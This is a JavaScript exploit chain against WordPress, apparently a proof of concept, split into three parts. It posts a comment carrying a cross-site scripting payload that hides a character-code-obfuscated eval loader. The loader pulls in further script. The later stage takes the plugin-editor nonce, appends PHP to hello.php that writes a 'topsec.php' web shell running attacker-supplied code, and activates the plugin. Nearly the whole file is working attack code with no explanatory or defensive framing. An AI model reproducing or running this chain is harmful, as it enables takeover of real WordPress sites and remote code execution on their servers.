
//part 1 crsf.html
var baseurl = '';
var post_id = '';
var commentpost_url = '/wp-comments-post.php';
var page = '';
var playload_f = `<a title=' topsec" onmouseover=here id = " '`;
//poc = part2 
var poc = `eval(String.fromCharCode(118, 97, 114, 32, 115, 99, 114, 105, 112, 116, 95, 49, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59, 32, 115, 99, 114, 105, 112, 116, 95, 49, 46, 115, 114, 99, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 99, 111, 100, 101, 46, 106, 113, 117, 101, 114, 121, 46, 99, 111, 109, 47, 106, 113, 117, 101, 114, 121, 45, 50, 46, 49, 46, 49, 46, 109, 105, 110, 46, 106, 115, 34, 59, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 99, 114, 105, 112, 116, 95, 49, 41, 59, 32, 118, 97, 114, 32, 115, 99, 114, 105, 112, 116, 95, 50, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59, 32, 115, 99, 114, 105, 112, 116, 95, 50, 46, 115, 114, 99, 32, 61, 32, 34, 112, 97, 114, 116, 32, 51, 34, 59, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 99, 114, 105, 112, 116, 95, 50, 41, 59))`;
playload_f.replace('here',poc);
postdata.append('comment',playload_f);
postdata.append('comment_post_ID',post_id);
postdata.append('comment_parent',0);
postdata.append('_wp_unfiltered_html_comment',5201314);
postdata.append('submit','Post Comment');
jQuery.post(baseurl+commentpost_url,postdata,function(data){

	page = jQuery(data).find('#comments').find('ol.comment-list').children("li:last-child").find('a')[0];

	location.href = page;

})

var ajax_M = function(url, datas, headers, nsync, ijson, nrdm) {
        var callback = Array.prototype.slice.call(arguments, -1)[0];
        var url = url + ((!nrdm) ? '?love=' + (+new Date()) : '');
        var type = (datas && (typeof datas != 'function')) ? 'POST' : 'GET';
        var xhr = window.XMLHttpRequest ? (new XMLHttpRequest()) : (new ActiveXObject('Microsoft.XMLHTTP'));

        xhr.open(type, url, (nsync && (typeof nsync != 'function')) ? true : false);
        ((typeof headers != 'object') && (type == 'POST')) && (
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'));
        if (typeof headers == 'object') {
            for (var header in headers) {
                xhr.setRequestHeader(header, headers[header]);
            };
        };
        (typeof callback == 'function') && (xhr.onreadystatechange = function() {
            ((this.readyState == 4) &&
                (((this.status >= 200) &&
                        (this.status <= 300)) ||
                    (this.status == 304))
            ) && callback.apply(this, arguments)
        });
        var urlen = function(datas, post) {
            var uri = '';
            for (var data in datas) {
                uri += (data + '=' + encodeURIComponent(datas[data]) + '&');
                }
                return uri.slice(0, -1);
            };
            xhr.send((typeof datas == 'object' ? (ijson ? 'date=' + JSON.stringify(datas) : urlen(datas)) : datas));
            return xhr;
        }


//part2
var script_1 = document.createElement("script");
script_1.src = "http://code.jquery.com/jquery-2.1.1.min.js";
document.body.appendChild(script_1);
var script_2 = document.createElement("script");
script_2.src = "part 3";//
document.body.appendChild(script_2);

//part3
var wpnonce = '';
var admineditor = '../wp-admin/plugin-editor.php';
var editplugin = '../wp-admin/admin-ajax.php';
var activeplugin = '../wp-admin/plugins.php';
var payload = `
function exploit_heart(){ 
	file_put_contents("topsec.php",'<?php eval($_POST["topsec"]);');
} 
add_action('plugins_loaded','exploit_heart');
`
var pluginfile = 'hello.php';
var plugin = 'hello.php';
jQuery.get(admineditor,function(data2){
	wpnonce = jQuery(data2).find('#template #nonce').val();
	var p = jQuery(document).find('#wp-admin-bar-site-name').find('a')[0].href;
	var q = new URL(p+'plugin-editor.php');
	if(wpnonce){
		console.log("edit_plugin_nonce_get !"+wpnonce);
	}
	var postdata ={
		'action':'edit-theme-plugin-file',
		'file': pluginfile,
		'plugin':plugin,
		'nonce':wpnonce,
		'_wp_http_referer':q.pathname,
		'newcontent': jQuery(data2).find('#newcontent').val()+payload,
		'docs-list':'',
	}
	jQuery.ajax({
		url: editplugin,
		data: postdata,
		method: 'POST',
		success: function(){
					console.log("Success for edit plugin!");
					jQuery.get(activeplugin,function(data1){
						if(jQuery(data1).find('a.edit')[0]!=null){
							activeplugin=jQuery(data1).find('a.edit')[0].href.replace(location.href,"")
							if(activeplugin!=null){
								console.log(activeplugin);
								jQuery.get('../wp-admin/'+activeplugin,function(){
									console.log('activate the plugin!');
								})
							}
						}
					})
				}
	});
});
